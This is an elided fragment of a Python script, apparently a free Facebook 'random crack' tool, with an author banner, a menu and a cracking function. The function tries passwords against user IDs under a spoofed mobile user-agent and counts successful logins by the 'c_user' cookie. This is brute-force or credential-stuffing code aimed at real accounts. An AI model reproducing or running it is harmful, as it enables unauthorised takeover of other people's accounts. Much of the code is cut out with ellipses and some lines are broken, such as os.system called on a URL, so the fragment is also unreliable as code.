...
| $$  | $$ /$$__  $$| $$  | $$  /$$__/   /$$__  $$| $$ /$$__  $$      
| $$  | $$|  $$$$$$$| $$  | $$ /$$$$$$$$|  $$$$$$$| $$|  $$$$$$$      
|__/  |__/ \_______/|__/  |__/|________/ \_______/|__/ \_______/      
                                                                                                                                                                                                    
\033[1;31m(•)=============================================🥀
\033[1;36m[•] \033[1;34mCREATED BY   : » \033[1;34mOWNER Hanzala Khan
\033[1;32m[•] \033[1;36mFACEBOK      : » \033[1;36mhanzala khan 
\033[1;37m[•] \033[1;37mGITHUB       : » \033[1;37mhanzala
\033[1;33m[•] \033[1;34mSTATUS       : » \033[1;34mTOOL IS FREE
\033[1;35m[•] \033[1;36mBROTHER      : » \033[1;36mHONEY
\033[1;32m[•] \033[1;33mVERSION      : » \033[1;33m0.1
\033[1;34m[•] instagram.     :  > \033[1;32m @alone_hanzala
\033[1;31m(•)=============================================💔\n\n"""  
loop = 0
oks = []
cps = []
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("https://www.facebook.com/profile.php?id=100084130120182")
		menu()
    #if opt =='0':
    	#exit()
    #else:
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',}
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[Hanzal-OK] '+uid+' | '+ps)
		...
		sys.stdout.write('\r\33[1;37m[Hanzala-🥰] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
